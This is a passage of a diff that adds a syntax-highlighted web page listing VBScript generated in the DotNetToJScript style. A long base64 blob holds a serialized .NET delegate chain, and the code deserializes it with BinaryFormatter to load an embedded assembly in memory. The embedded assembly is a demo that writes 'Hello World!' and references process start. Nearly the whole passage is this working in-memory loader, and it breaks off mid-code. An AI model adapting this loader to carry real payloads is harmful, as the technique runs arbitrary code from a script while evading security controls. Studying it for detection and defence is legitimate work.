+<span class="k">End</span> <span class="k">Sub</span>
+
+<span class="k">Sub</span> <span class="nf">SetVersion</span>
+<span class="k">End</span> <span class="k">Sub</span>
+
+<span class="k">Function</span> <span class="nf">Base64ToStream</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+  <span class="k">Dim</span> <span class="nv">enc</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">ba</span><span class="p">,</span> <span class="n">transform</span><span class="p">,</span> <span class="n">ms</span>
+  <span class="k">Set</span> <span class="n">enc</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"System.Text.ASCIIEncoding"</span><span class="p">)</span>
+  <span class="n">length</span> <span class="o">=</span> <span class="n">enc</span><span class="p">.</span><span class="n">GetByteCount_2</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+  <span class="k">Set</span> <span class="n">transform</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"System.Security.Cryptography.FromBase64Transform"</span><span class="p">)</span>
+  <span class="k">Set</span> <span class="n">ms</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"System.IO.MemoryStream"</span><span class="p">)</span>
+  <span class="n">ms</span><span class="p">.</span><span class="n">Write</span> <span class="n">transform</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">enc</span><span class="p">.</span><span class="n">GetBytes_4</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="n">length</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+  <span class="n">ms</span><span class="p">.</span><span class="n">Position</span> <span class="o">=</span> <span class="mi">0</span>
+  <span class="k">Set</span> <span class="n">Base64ToStream</span> <span class="o">=</span> <span class="n">ms</span>
+<span class="k">End</span> <span class="k">Function</span>
+
+<span class="k">Sub</span> <span class="nf">Run</span>
+<span class="k">Dim</span> <span class="nv">s</span><span class="p">,</span> <span class="n">entry_class</span>
+<span class="n">s</span> <span class="o">=</span> <span class="s">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAqSoQYAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAA4AAiIAsBMAAACAAAAAgAAAAAAADuJwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAnCcA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAGQmAAAcAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAALnRleHQAAAD0BwAAACAAAAAIAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAABgAAAAoAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAANAnAAAAAAAASAAAAAIABQB0IAAA8AUAAAEAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZgIoDgAACgAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cgEAAHByKQAAcCgPAAAKAComAAMoEAAACiYqQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"BQBsAAAA4AEAACN+AABMAgAASAIAACNTdHJpbmdzAAAAAJQEAABEAAAAI1VTANgEAAAQAAAAI0dV"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"SUQAAADoBAAACAEAACNCbG9iAAAAAAAAAAIAAAFHFQAACQAAAAD6ATMAFgAAAQAAABEAAAACAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AgAAAAEAAAAQAAAADgAAAAEAAAACAAAAAABzAQEAAAAAAAYA4wDYAQYAUAHYAQYAMACmAQ8A+AEA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAYAWACOAQYAxgCOAQYApwCOAQYANwGOAQYAAwGOAQYAHAGOAQYAbwCOAQYARAC5AQYAIgC5AQYA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"igCOAQYAHAKHAQYAHQAKAAoAFAKmAQAAAAABAAAAAAABAAEAAQAQAAcCAAA9AAEAAQBQIAAAAACG"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"GKABBgABAGogAAAAAIYAEQIQAAEAAAABAG4BCQCgAQEAEQCgAQYAGQCgAQoAKQCgARAAMQCgARAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"OQCgARAAQQCgARAASQCgARAAUQCgARAAWQCgARAAYQCgARUAaQCgARAAcQCgARAAeQCgAQYAgQAp"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AhoAiQAjAiAALgALAC8ALgATADgALgAbAFcALgAjAGAALgArAHUALgAzAJ8ALgA7AJ8ALgBDAGAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"LgBLAKUALgBTAJ8ALgBbAJ8ALgBjAMoALgBrAPQAQwBbAAEBBIAAAAEAAAAAAAAAAAAAAAAANgIA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAIAAAAAAAAAAAAAACYAFAAAAAAAAgAAAAAAAAAAAAAAJgCHAQAAAAAAAAAAADxNb2R1bGU+AFN5"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"c3RlbS5JTwBtc2NvcmxpYgBGaWxlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBD"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"b21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1h"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3Vy"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"YXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJl"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"bGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHly"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"aWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxp"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dHlBdHRyaWJ1dGUAcGF0aABFeGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVj"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZp"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"Y2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAVGVzdENs"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"YXNzAFJ1blByb2Nlc3MAT2JqZWN0AFN0YXJ0AFdyaXRlQWxsVGV4dABFeGFtcGxlQXNzZW1ibHkA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAJ2MAOgBcAHQAZQBtAHAAXABpAHQAdwBvAHIAawBzAC4AdAB4AHQAABlIAGUAbABsAG8AIABX"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AG8AcgBsAGQAIQAAAIVUN9T4WmVMnBjh7sS7LhEABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AgEODgUAARJFDgi3elxWGTTgiQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cwEIAQAHAQAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3Ig"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"RG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAx"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"NwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAUBAAEAAAAAAAAAqSoQYAAAAAACAAAAHAEAAIAmAACACAAAUlNEUyaBjRgFixJPmfMCVzSwEw4B"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAARDpcU29mdHdhcmVzXERvdE5ldFRvSlNjcmlwdFxFeGFtcGxlQXNzZW1ibHlcb2JqXERlYnVn"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"XEV4YW1wbGVBc3NlbWJseS5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEJwAAAAAAAAAAAADeJwAAACAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAA0CcAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBv"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4A"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"ZwBGAGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBt"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AGUAbgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8A"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dABOAGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBl"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0A"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cABsAGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAx"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AC4AMAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"bABlAEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBp"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"dwAgADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAUAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"QQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AEUAeABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"cgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQBy"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAADwNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">&amp;</span> <span class="s">"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"</span>
+<span class="n">entry_class</span> <span class="o">=</span> <span class="s">"TestClass"</span>
+
+<span class="k">Dim</span> <span class="nv">fmt</span><span class="p">,</span> <span class="n">al</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">o</span>
+<span class="k">Set</span> <span class="n">fmt</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"</span><span class="p">)</span>
+<span class="k">Set</span> <span class="n">al</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"System.Collections.ArrayList"</span><span class="p">)</span>
+<span class="n">al</span><span class="p">.</span><span class="n">Add</span> <span class="n">Empty</span>
+
